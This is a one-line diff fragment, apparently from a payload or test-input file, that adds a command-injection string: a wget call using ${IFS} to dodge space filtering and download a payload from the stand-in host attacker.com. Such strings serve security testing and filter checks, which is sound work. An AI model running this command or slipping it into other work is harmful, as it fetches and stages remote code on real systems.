@@ -1,0 +1,1 @@
+wget${IFS}http://attacker.com/payload
